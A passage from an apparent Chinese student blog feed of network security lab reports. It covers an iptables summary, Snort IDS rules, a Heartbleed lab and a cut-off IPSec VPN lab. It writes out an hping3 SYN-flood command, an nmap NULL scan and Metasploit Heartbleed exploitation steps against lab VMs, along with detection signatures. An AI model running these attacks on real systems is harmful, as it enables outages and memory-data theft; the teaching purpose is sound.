<h3 id="实验总结-1"><a href="#实验总结-1" class="headerlink" title="实验总结"></a>实验总结</h3><p>本次实验让我对iptables防火墙的工作原理有了更深入的理解。我成功设置了iptables规则，实现了内网服务的发布。通过实践，我认识到iptables作为工作在网络层的防火墙，通过内核层面的netfilter来处理TCP&#x2F;IP数据包，这种机制确实具有很高的效率和稳定性。</p>
<p>在实验过程中，我首先配置了网络环境，确保各个节点之间的连通性。我特别注意到了防火墙路由转发的设置，这是实现服务发布的关键步骤。通过精心设计iptables规则，我实现了数据包的正确转发和地址转换。</p>
<p>最让我有成就感的是，当我在公网主机上访问防火墙的公网IP时，成功获得了内网服务器提供的服务。这个结果验证了我的配置是正确的，也让我切实感受到了防火墙在网络中的重要作用。通过DNAT和SNAT的配合使用，我实现了在保护内网安全的同时，又能让外部用户访问内网服务。</p>
<p>通过这次实验，我不仅掌握了iptables的具体配置方法，更重要的是理解了防火墙策略的设计思路。我认识到，一个合理的防火墙配置既要保证服务的可用性，又要确保网络的安全性，这需要在实践中不断摸索和优化。这次实验为我后续学习更复杂的网络安全管理打下了坚实的基础。</p>
]]></content>
      <categories>
        <category>第5学期实验</category>
        <category>网络安全实验</category>
      </categories>
      <tags>
        <tag>北邮</tag>
        <tag>实验</tag>
        <tag>网络安全</tag>
      </tags>
  </entry>
  <entry>
    <title>网络安全实验5：入侵检测</title>
    <url>/2025/11/27/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C5/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="入侵检测课堂实验"><a href="#入侵检测课堂实验" class="headerlink" title="入侵检测课堂实验"></a>入侵检测课堂实验</h2><h3 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a>实验目的</h3><p>1.在linux平台建立基于Snort的IDS。</p>
<p>2.在部署snort的本机建立规则，实现对dos攻击、nmap扫描和ssh连接的检测。</p>
<h3 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h3><p>1.虚拟机：ubuntu、kali</p>
<p>2.工具：nmap、snort、hping3</p>
<h3 id="实验过程与结果"><a href="#实验过程与结果" class="headerlink" title="实验过程与结果"></a>实验过程与结果</h3><h4 id="步骤一：课前准备"><a href="#步骤一：课前准备" class="headerlink" title="步骤一：课前准备"></a>步骤一：课前准备</h4><p>1.安装snort</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install -y snort</span><br></pre></td></tr></table></figure>

<p>下载完成后，会提示进行相应配置，按要求配置即可</p>
<p>首先是输入CIDR格式的本地网段（例如我的主机ip是192.168.204.136，所以配置为192.168.0.0&#x2F;16）。其次是填写网卡位置，网卡位置可通过ifconfig指令查看，此图中即为ens33</p>
<p><img src="/2025/11/27/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C5/img1.png" alt="图1"></p>
<p>2.配置一些必要文件夹</p>
<p>（1）Snort的安装目录</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> <span class="built_in">mkdir</span> -p /etc/snort/rules/iplists</span><br><span class="line"><span class="built_in">sudo</span> <span class="built_in">mkdir</span> -p /etc/snort/preproc_rules</span><br><span class="line"><span class="built_in">sudo</span> <span class="built_in">mkdir</span> /usr/local/lib/snort_dynamicrules</span><br><span class="line"><span class="built_in">sudo</span> <span class="built_in">mkdir</span> /etc/snort/so_rules</span><br></pre></td></tr></table></figure>

<p><img src="/2025/11/27/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C5/img2.png" alt="图2"></p>
<p>（2）存储过滤规则和服务器黑白名单</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> <span class="built_in">touch</span> /etc/snort/rules/iplists/default.blacklist</span><br><span class="line"><span class="built_in">sudo</span> <span class="built_in">touch</span> /etc/snort/rules/iplists/default.whitelist</span><br><span class="line"><span class="built_in">sudo</span> <span class="built_in">touch</span> /etc/snort/rules/so_rules</span><br></pre></td></tr></table></figure>

<p><img src="/2025/11/27/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C5/img3.png" alt="图3"></p>
<p>（3）创建日志目录</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> <span class="built_in">mkdir</span> /var/log/snort</span><br><span class="line"><span class="built_in">sudo</span> <span class="built_in">mkdir</span> /var/log/snort/archived_logs</span><br></pre></td></tr></table></figure>

<p><img src="/2025/11/27/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C5/img4.png" alt="图4"></p>
<p>（4）调整权限</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> <span class="built_in">chmod</span> -R 5775 /etc/snort</span><br><span class="line"><span class="built_in">sudo</span> <span class="built_in">chmod</span> -R 5775 /var/log/snort</span><br><span class="line"><span class="built_in">sudo</span> <span class="built_in">chmod</span> -R 5775 /var/log/snort/archived_logs</span><br><span class="line"><span class="built_in">sudo</span> <span class="built_in">chmod</span> -R 5775 /etc/snort/rules/so_rules</span><br><span class="line"><span class="built_in">sudo</span> <span class="built_in">chmod</span> -R 5775 /usr/local/lib/snort_dynamicrules</span><br></pre></td></tr></table></figure>

<p><img src="/2025/11/27/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C5/img5.png" alt="图5"></p>
<p>3.修改默认配置</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> nano /etc/snort/snort.conf</span><br></pre></td></tr></table></figure>

<p>（1）首先根据自己的ip配置网络信息（45行左右）,我的主机ip是192.168.204.136，所以配置为192.168.0.0&#x2F;16</p>
<p><img src="/2025/11/27/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C5/img6.png" alt="图6"></p>
<p>然后修改默认文件路径（111行左右）</p>
<p><img src="/2025/11/27/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C5/img7.png" alt="图7"></p>
<p>（2）在配置完成后，可以通过sudo snort -c &#x2F;etc&#x2F;snort&#x2F;snort.conf -A fast -l &#x2F;var&#x2F;log&#x2F;snort -i ens33命令，简单测试配置是否正确。若正确，则将启动snort</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> snort -c /etc/snort/snort.conf -A fast -l /var/log/snort -i ens33</span><br></pre></td></tr></table></figure>

<p><img src="/2025/11/27/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C5/img8.png" alt="图8"></p>
<h4 id="步骤二：Snort检测DoS（syn-flood）攻击"><a href="#步骤二：Snort检测DoS（syn-flood）攻击" class="headerlink" title="步骤二：Snort检测DoS（syn flood）攻击"></a>步骤二：Snort检测DoS（syn flood）攻击</h4><p>1.Snort&#x2F;rules目录下的local.rules文件中，设置如下规则</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> nano /etc/snort/rules/local.rules</span><br><span class="line">alert tcp any any -&gt; <span class="variable">$HOME_NET</span> 80 (msg:<span class="string">&quot;DoS attack&quot;</span>; flags:S; threshold:<span class="built_in">type</span> threshold, track by_dst, count 100, seconds 60; sid:2000003)</span><br></pre></td></tr></table></figure>

<p><img src="/2025/11/27/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C5/img9.png" alt="图9"></p>
<p>2.打开snort.conf，注释掉include $RULE_PATH&#x2F;icmp-info.rules（608行）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> nano /etc/snort/snort.conf</span><br></pre></td></tr></table></figure>

<p><img src="/2025/11/27/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C5/img10.png" alt="图10"></p>
<p>3.启动snort</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> snort -c /etc/snort/snort.conf -A fast -l /var/log/snort -i ens33</span><br></pre></td></tr></table></figure>

<p><img src="/2025/11/27/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C5/img11.png" alt="图11"></p>
<p>4.使用另一台kali使用hping3攻击（在dos实验中使用过的）。在日志中查看检测报告(cat &#x2F;var&#x2F;log&#x2F;snort&#x2F;alert)</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> hping3</span><br><span class="line">hping3 -c 10000 -d 10000 -S -w 64 -p 80 --flood 192.168.204.136</span><br></pre></td></tr></table></figure>

<p><img src="/2025/11/27/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C5/img12.png" alt="图12"></p>
<p>5.可以看到检测报告。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> <span class="built_in">cat</span> /var/log/snort/alert</span><br></pre></td></tr></table></figure>

<p><img src="/2025/11/27/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C5/img13.png" alt="图13"></p>
<h4 id="步骤三：Snort检测nmap扫描"><a href="#步骤三：Snort检测nmap扫描" class="headerlink" title="步骤三：Snort检测nmap扫描"></a>步骤三：Snort检测nmap扫描</h4><p>1.以nmap NULL扫描为例：同理在local.rules中写下如下规则：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> nano /etc/snort/rules/local.rules</span><br><span class="line">alert tcp <span class="variable">$EXTERNAL_NET</span> any -&gt; <span class="variable">$HOME_NET</span> any (msg:”Nmap Null PortScan!”; flags:0; threshold:<span class="built_in">type</span> both,track by_dst,count 20,seconds 60; sid:10000012; rev:1;)</span><br></pre></td></tr></table></figure>

<p><img src="/2025/11/27/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C5/img14.png" alt="图14"></p>
<p>2.nmap NULL扫描是nmap秘密扫描的一种，相对比较隐蔽，通过向目标主机端口发送标志位flags为0的包进行扫描。使用kali中的nmap对主机进行NULL扫描。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sN 192.168.204.136</span><br></pre></td></tr></table></figure>

<p><img src="/2025/11/27/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C5/img15.png" alt="图15"></p>
<p><img src="/2025/11/27/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C5/img16.png" alt="图16"></p>
<p>3.查看snort报警信息。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> <span class="built_in">cat</span> /var/log/snort/alert</span><br></pre></td></tr></table></figure>

<p><img src="/2025/11/27/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C5/img17.png" alt="图17"></p>
<h3 id="步骤四：Snort检测ssh连接"><a href="#步骤四：Snort检测ssh连接" class="headerlink" title="步骤四：Snort检测ssh连接"></a>步骤四：Snort检测ssh连接</h3><p>1.首先将两台机器（可以是主机和虚拟机）的ssh服务开启。</p>
<p>（1）kali开启ssh服务命令</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> /etc/init.d/ssh start</span><br></pre></td></tr></table></figure>

<p><img src="/2025/11/27/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C5/img18.png" alt="图18"></p>
<p>（2）先安装ssh服务，后启动</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install openssh-server -y</span><br></pre></td></tr></table></figure>

<p><img src="/2025/11/27/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C5/img19.png" alt="图19"></p>
<p>（3）启动服务，查看服务状态</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> systemctl <span class="built_in">enable</span> --now ssh</span><br><span class="line"><span class="built_in">sudo</span> systemctl status ssh</span><br></pre></td></tr></table></figure>

<p><img src="/2025/11/27/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C5/img20.png" alt="图20"></p>
<p>2.自主编写规则local.rules，检测ssh连接行为，从使用到的端口角度，并添加到rules中。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> nano /etc/snort/rules/local.rules</span><br><span class="line">alert tcp any any -&gt; <span class="variable">$HOME_NET</span> 22 (msg:“ssh connection”; sid:100000003)</span><br></pre></td></tr></table></figure>

<p><img src="/2025/11/27/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C5/img21.png" alt="图21"></p>
<p>3.连接ssh</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh ubuntu@192.168.204.136</span><br></pre></td></tr></table></figure>

<p><img src="/2025/11/27/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C5/img22.png" alt="图22"></p>
<p>4.查看snort信息，可以看到成功检测到了ssh连接！</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> <span class="built_in">cat</span> /var/log/snort/alert</span><br></pre></td></tr></table></figure>

<p><img src="/2025/11/27/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C5/img23.png" alt="图23"></p>
<h3 id="实验总结"><a href="#实验总结" class="headerlink" title="实验总结"></a>实验总结</h3><p>在本实验中，我成功在Linux平台上建立了一套基于Snort的入侵检测系统（IDS）。整个实验的核心在于部署Snort引擎后，通过自主编写和配置检测规则，赋予其识别特定网络威胁的能力。我们针对三种典型的恶意或可疑行为——具有洪水特征的DoS攻击、用于信息搜集的nmap扫描以及潜在的未经授权SSH连接——精心设计了相应的检测规则。这些规则能够实时分析流经本机的网络流量，一旦匹配到预设的攻击模式，系统便会立即生成详细的警报日志，从而实现对目标威胁的有效监控与发现。</p>
<p>通过亲手完成从环境搭建、规则编写到功能测试的全过程，我们不仅掌握了Snort这一经典IDS工具的基本配置方法，更深入理解了如何根据具体攻击的特征（如异常流量、特殊标志位、特定端口与载荷）来构建检测逻辑。这次实践将理论知识与应用技能紧密结合，显著提升了对网络安全主动防御机制的认知水平和实操能力，为后续应对更复杂的安全挑战奠定了坚实的基础。</p>
<h2 id="入侵检测课后实验"><a href="#入侵检测课后实验" class="headerlink" title="入侵检测课后实验"></a>入侵检测课后实验</h2><h3 id="实验目的-1"><a href="#实验目的-1" class="headerlink" title="实验目的"></a>实验目的</h3><p>漏洞攻击检测实验：构造具有漏洞的目标环境（系统漏洞、软件漏洞、数据库漏洞、服务漏洞等），根据目标环境漏洞设计针对性攻击，达到攻击效果，并配置snort实现对漏洞攻击的检测。（heartbleed漏洞攻击）</p>
<h3 id="实验环境-1"><a href="#实验环境-1" class="headerlink" title="实验环境"></a>实验环境</h3><p>1.虚拟机：ubuntu、kali</p>
<p>2.工具：nmap、snort</p>
<h3 id="实验过程与结果-1"><a href="#实验过程与结果-1" class="headerlink" title="实验过程与结果"></a>实验过程与结果</h3><p>1.设置规则</p>
<p>（1）进入Snort&#x2F;rules目录下的local.rules文件中</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> nano /etc/snort/rules/local.rules</span><br></pre></td></tr></table></figure>

<p>设置以下规则</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">alert tcp any any -&gt; <span class="variable">$HOME_NET</span> 8443 (msg:<span class="string">&quot;HEARTBLEED ATTACK!&quot;</span>;content:<span class="string">&quot;|1803|&quot;</span>;depth:2;content:<span class="string">&quot;|01|&quot;</span>;sid:1000001;rev:1;)</span><br></pre></td></tr></table></figure>

<p><img src="/2025/11/27/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C5/p1.png" alt="图1"></p>
<p>规则解释：心脏出血漏洞主要通过攻击者模拟向服务器端发送自己编写的Heartbeat心跳数据包，主要是HeartbeatMessage的长度与payload的length进行匹配，若payload_lenght长度大于HeartbeatMessage的length，则会在服务器返回的response响应包中产生数据溢出，造成有用数据泄露。</p>
<p>HeartbeatMes sage的length为2^14字节即16384字节，协议是TCP，面向的端口是 443 即HTTP&#x2F;HTTPS服务，本实验采用docker环境复现,因此端口使用8443。</p>
<p>（2）注意要注释掉自带对应规则库。</p>
<p>打开snort.conf，注释掉include $RULE_PATH&#x2F;icmp-info.rules（608 行）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> nano /etc/snort/snort.conf</span><br></pre></td></tr></table></figure>

<p><img src="/2025/11/27/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C5/p2.png" alt="图2"></p>
<p>2.启动snort</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> snort -c /etc/snort/snort.conf -A fast -l /var/log/snort -i ens33</span><br></pre></td></tr></table></figure>

<p><img src="/2025/11/27/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C5/p3.png" alt="图3"></p>
<p><img src="/2025/11/27/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C5/p4.png" alt="图4"></p>
<p>3.启动docker。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> systemctl start docker</span><br></pre></td></tr></table></figure>

<p><img src="/2025/11/27/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C5/p5.png" alt="图5"></p>
<p>4.进入环境所在目录启动环境。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /home/ubuntu/Desktop/vulhub-master/openssl/CVE-2014-0160</span><br><span class="line"><span class="built_in">sudo</span> docker-compose up -d</span><br></pre></td></tr></table></figure>

<p><img src="/2025/11/27/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C5/p6.png" alt="图6"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> docker ps</span><br></pre></td></tr></table></figure>

<p><img src="/2025/11/27/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C5/p7.png" alt="图7"></p>
<p>5.打开浏览器输入<a href="https://192.168.204.136:8443，出现Heartbleed">https://192.168.204.136:8443，出现Heartbleed</a> Test说明环境启动成功。</p>
<p><img src="/2025/11/27/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C5/p8.png" alt="图8"></p>
<p>6.使用msf利用漏洞。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure>

<p><img src="/2025/11/27/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C5/p9.png" alt="图9"></p>
<p><img src="/2025/11/27/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C5/p10.png" alt="图10"></p>
<p>7.打开msf后，查找heartbleed模块，查看需要设置哪些选项。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">search heartbleed</span><br><span class="line">use auxiliary/scanner/ssl/openssl_heartbleed</span><br><span class="line">show options</span><br></pre></td></tr></table></figure>

<p><img src="/2025/11/27/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C5/p11.png" alt="图11"></p>
<p>8.设置靶机地址RHOSTS和靶机端口号RPORT，同时设置verbose以看到泄露的信息。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span> RHOSTS 192.168.204.136</span><br><span class="line"><span class="built_in">set</span> RPORT 8443</span><br><span class="line"><span class="built_in">set</span> verbose <span class="literal">true</span></span><br></pre></td></tr></table></figure>

<p><img src="/2025/11/27/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C5/p12.png" alt="图12"></p>
<p>9.exploit，可以看到泄露的数据，漏洞利用成功。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">exploit</span><br></pre></td></tr></table></figure>

<p><img src="/2025/11/27/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C5/p13.png" alt="图13"></p>
<p><img src="/2025/11/27/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C5/p14.png" alt="图14"></p>
<p><img src="/2025/11/27/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C5/p15.png" alt="图15"></p>
<p>10.在日志中查看检测报告</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> <span class="built_in">cat</span> /var/log/snort/alert</span><br></pre></td></tr></table></figure>

<p><img src="/2025/11/27/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C5/p16.png" alt="图16"></p>
<p><img src="/2025/11/27/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C5/p17.png" alt="图17"></p>
<h3 id="实验总结-1"><a href="#实验总结-1" class="headerlink" title="实验总结"></a>实验总结</h3><p>在本实验中，我围绕备受关注的OpenSSL心脏出血漏洞展开了一次完整的漏洞攻击检测实践。我们首先利用Vulhub漏洞环境快速搭建了存在Heartbleed漏洞的OpenSSL 1.0.1c服务环境，通过Docker容器技术构建了包含Nginx和脆弱OpenSSL版本的目标系统，为后续攻击检测提供了真实的实验平台。这一环境的成功部署不仅还原了2014年该漏洞影响下的真实场景，也为我们理解漏洞原理和攻击特征奠定了坚实基础。</p>
<p>在攻击阶段，我使用了多种技术手段验证漏洞的存在性和可利用性。通过专门的心跳请求数据包构造，我们成功触发了OpenSSL的内存信息泄露机制，能够从目标服务器内存中提取出敏感信息片段，直观地演示了该漏洞对数据传输保密性的严重威胁。这一过程让我们深刻体会到，即使没有传统意义上的缓冲区溢出或代码执行，信息泄露类漏洞同样可能带来灾难性后果，特别是当内存中残留着会话令牌、用户凭证等关键数据时。</p>
<p>这次实验让我们从防御者视角深入理解了现代入侵检测系统的运作机制和规则设计哲学。面对不断演进的网络威胁，仅依靠传统的特征匹配已不足以应对高级攻击，需要结合协议分析、行为检测等多种技术手段。通过亲手实践从环境搭建、攻击模拟到检测防御的全流程，我们不仅掌握了具体工具的使用方法，更重要的是建立了主动安全防御的思维模式，为今后从事网络安全相关工作积累了宝贵的实战经验。</p>
]]></content>
      <categories>
        <category>第5学期实验</category>
        <category>网络安全实验</category>
      </categories>
      <tags>
        <tag>北邮</tag>
        <tag>实验</tag>
        <tag>网络安全</tag>
      </tags>
  </entry>
  <entry>
    <title>网络安全实验6：VPN</title>
    <url>/2025/12/09/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C6/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="VPN实验"><a href="#VPN实验" class="headerlink" title="VPN实验"></a>VPN实验</h2><h3 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a>实验目的</h3><p>1.Windows IPSec配置</p>
<p>2.抓包分析IKE SA和IPSec SA建立过程</p>
<h3 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h3><p>1.虚拟机：Windows XP*2</p>
<p>2.工具：wireshark</p>
<h3 id="实验过程与结果"><a href="#实验过程与结果" class="headerlink" title="实验过程与结果"></a>实验过程与结果</h3><h4 id="步骤一：配置-Windows内置的IPSec安全策略"><a href="#步骤一：配置-Windows内置的IPSec安全策略" class="headerlink" title="步骤一：配置 Windows内置的IPSec安全策略"></a>步骤一：配置 Windows内置的IPSec安全策略</h4><ol>
<li>“Win+R”输入“secpol.msc”打开本地安全设置窗口，右键创建IP安全策略。</li>
</ol>
<p><img src="/2025/12/09/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C6/img1.png" alt="图1"></p>
<p><img src="/2025/12/09/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C6/img2.png" alt="图2"></p>
<p>2.创建IP安全策略。一直点击下一步，勾选“激活默认相应规则”，并在默认响应规则身份验证方式中 设置预共享密钥为“123456”，点击下一步直至完成。</p>
<p><img src="/2025/12/09/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C6/img3.png" alt="图3"></p>
<ol start="3">
<li>修改新建策略的属性，添加安全规则。不指定隧道终结点，适用于所有网络连接，使用“abcdef”作为预共享密钥保护密钥交换。</li>
</ol>
<p><img src="/2025/12/09/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C6/img4.png" alt="图4"></p>
<p><img src="/2025/12/09/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C6/img5.png" alt="图5"></p>
<p>4.添加IP筛选器列表，在新的筛选器列表添加新的筛选器，然后添加筛选器操作。在筛选器列表选择“所有IP通讯量”。</p>
<p><img src="/2025/12/09/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C6/img6.png" alt="图6"></p>
<p>5.在筛选器操作界面选择“需要安全”，然后完成修改属性。</p>
<p><img src="/2025/12/09/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C6/img7.png" alt="图7"></p>
<p>6.在另一台Windows主机上执行相似的操作。至此，IPSec已配置完成。</p>
<h4 id="步骤二：查看主机信息并测试连接"><a href="#步骤二：查看主机信息并测试连接" class="headerlink" title="步骤二：查看主机信息并测试连接"></a>步骤二：查看主机信息并测试连接</h4><p>1.ipconfig查看两台主机的ip信息。</p>
<p><img src="/2025/12/09/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C6/img8.png" alt="图8"></p>
<p><img src="/2025/12/09/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C6/img9.png" alt="图9"></p>
<p>2.从主机1 ping主机2测试两者之间的连接，结果如下图所示则说明通过上面的配置，两台计算机在建 立安全的 IPSec 连接之前，首先对IP安全规则的SA进行协商，显示“Negotiating IP Security”，以协商 建立相互通讯时共享的安全参数及验证的密钥。协商完成后，可以看出两台计算机处于连通状态.</p>
<p><img src="/2025/12/09/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C6/img10.png" alt="图10"></p>
<h4 id="步骤三：wireshark抓包并分析"><a href="#步骤三：wireshark抓包并分析" class="headerlink" title="步骤三：wireshark抓包并分析"></a>步骤三：wireshark抓包并分析</h4><p>1.在以上主机1 ping主机2的同时使用wireshark抓包，抓包结果如下图所示。由抓包结果可知，首先在主机1和主机2之间交换了多个ISAKMP数据包用于密钥协商和安全传输的协商过程，协商完成后交换ESP数据包进行ping命令。</p>
<p><img src="/2025/12/09/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C6/img11.png" alt="图11"></p>
<p>2.接下来分析IKE SA 和 IPSEC SA 建立过程：</p>
<p>要建立IPSec连接，首先要协商一个IKE SA，然后在IKE SA的基础上协商IPSec SA</p>
<p>（1）IKE SA ：分为3个阶段</p>
<p><strong>第一阶段：进行SA交换，协商确认有关安全策略。该过程进行安全协商。</strong></p>
<p>①包1：确定加密算法和认证方式。</p>
<p><img src="/2025/12/09/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C6/img12.png" alt="图12"></p>
<p>Initiator cookie：发起者与响应者的SPI。</p>
<p>Responder cookie：告知主机2将要使用哪个IPSEC密钥来加密封包，因为这是第一个包所以响应者SPI为空。</p>
<p>Version：IKE版本号。</p>
<p>Exchange type：Main mode表示IKE协商模式为主模式。</p>
<p><img src="/2025/12/09/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C6/img13.png" alt="图13"></p>
<p>Encryption-Algorithm：加密算法为3DES的CBC加密模式。</p>
<p>Hash-Algorithm：验证完整性算法为SHA算法。</p>
<p>Authentication-Method：使用预共享密钥进行认证。</p>
<p>Life-Type和Life-Duration：密钥周期。</p>
<p>②包2：参数比对成功，反馈和第一个包相似内容</p>
